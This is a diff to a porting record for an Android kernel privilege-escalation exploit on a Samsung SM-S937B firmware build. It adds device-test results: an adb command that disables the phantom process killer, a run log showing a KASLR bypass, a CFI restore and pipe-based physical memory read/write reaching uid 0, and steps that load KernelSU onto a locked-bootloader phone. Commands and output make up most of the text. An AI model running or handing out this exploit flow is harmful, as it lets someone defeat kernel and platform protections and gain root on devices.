@@ -1,8 +1,9 @@
 # SM-S937B / S937BXXS7CZE1 porting record
 
-Offline port from firmware analysis only; **not yet executed on hardware**.
+Device-tested temporary root + KernelSU (LKM jailbreak mode) on 2026-08-16.
+Locked bootloader; no persistent boot.img modification. Re-establish per boot.
 Sister profile of [`SM-S9370-S9370ZCS9CZG1.md`](SM-S9370-S9370ZCS9CZG1.md)
-(same `psq` board), which was device-tested on 2026-08-07.
+(same `psq` board), device-tested on 2026-08-07.
 
 ## 1. Firmware identity
 
@@ -126,9 +127,86 @@ matching must resolve `SM-S937B` to exactly one payload. Other `SM-S937x`
 regional models remain on the generic entry until their own `psq` profiles
 are ported.
 
-## 9. Scope
+## 9. Device validation (2026-08-16)
 
-Verified only by offline analysis against `S937BXXS7CZE1`. Hardware
-execution on `SM-S937B` is still pending; expected behavior matches the
-device-verified CZG1 profile, given the identical `.text` and the two
-corrected data offsets.
+### Environment prerequisite: phantom process killer
+
+Stock One UI 8 kills a uid's entire phantom-process set once it exceeds 32
+processes; this exploit's mm spray forks ~800 children, so the payload tree
+was SIGKILLed mid-run (`exit 137`) before any offset was exercised. Disable
+phantom tracking for the test session:
+
+```sh
+adb shell settings put global settings_enable_monitor_phantom_procs false
+```
+
+Restore afterwards with `settings delete global
+settings_enable_monitor_phantom_procs`. With phantom trimming active the
+supervisor and all children die simultaneously without a per-attempt report.
+
+### Exploit (manual `--run-payload` over adb, shell uid)
+
+Run 1 scanned and found slide `0x40000`; run 2 forced it via
+`SLIDE_P0_OFFSET=0x40000` and rooted (its attempt 4/24):
+
+```text
+[+] slide-kaslr-ok source=forced base=ffffffc080040000 slide=0000000000040000
+[*] app fops stage=trigger-return attempt=1 triggered=1
+[*] cfi restoring misc_fops target=ffffff802a4bd7f0 value=ffffffc08144b440
+[*] pipe caches normal1k=ffffff8001cf4b00 normal2k=ffffff8001cf4c00 cgroup1k=ffffff8001cf4b00 cgroup2k=ffffff8001cf4c00 selected=ffffff8001cf4c00
+[*] pipe page idx=0 page=ffffff8834978000 head=fffffffe20d25e00 cache08=ffffff8001cf4c00 ... match=1
+[*] phys step pipe probe found=1
+[*] root umh result wake=1 complete=1 retval=0 socket=1
+[+] pipe physrw done=1 root=1 read_ok=1 write_ok=1 rw64=1/1 uid=2000->0
+[+] exploit completed attempt=4/24
+```
+
+The fingerprint match is 7/8 words (`best=7 second=0`): word 3 of the probe
+row is a `b` instruction that boot patching rewrites to `nop`, so it can
+never match the static Image at runtime. Unique match regardless.
+
+Temporary root:
+
+```sh
+$ adb shell "/data/local/tmp/cve-root -c id"
+uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
+```
+
+### KernelSU re-establish
+
+Same flow as CZG1 with one addition: the pushed loader needs the exec bit
+(`adb push` lands it `0664`), otherwise the logcat bind-mount exec fails
+with EACCES:
+
+```sh
+$ adb push kernelsu/ksud-s25u-kdp /data/local/tmp/ksud-s25u-kdp
+$ adb shell "chmod 755 /data/local/tmp/ksud-s25u-kdp"
+$ adb shell "/data/local/tmp/cve-root -c 'echo 1 > /proc/sys/kernel/kptr_restrict'"
+$ adb shell "cp /data/local/tmp/ksud-s25u-kdp /data/local/tmp/.ksud-stage && chmod 755 /data/local/tmp/.ksud-stage"
+$ adb shell "/data/local/tmp/cve-root --late-load"   # silent; restores Enforcing
+```
+
+### Verification
+
+```sh
+$ adb shell "cat /proc/modules | grep kernelsu; getenforce"
+kernelsu 172032 0 - Live 0x0000000000000000 (O)
+Enforcing
+```
+
+KernelSU is in LKM jailbreak mode (no `/sys/module/kernelsu`), same as CZG1.
+
+### DEFEX note
+
+This build's DEFEX blocks even the exploit's root task from some paths
+(`Immutable root violation` on `/data/adb`, `/data/local/tests/*`). It does
+not affect the exploit or the late-load flow above.
+
+## 10. Scope
+
+Device-tested on `SM-S937B` / `S937BXXS7CZE1` (EUX, `pe17667d` GKI).
+`targets-v3.json` lists only `SM-S937B` for this payload.
+
+Both temp root and KSU are per-boot (locked bootloader; no persistent
+boot.img modification). Re-establish after reboot: exploit →
+`kptr_restrict=1` → recreate `/data/local/tmp/.ksud-stage` → `--late-load`.
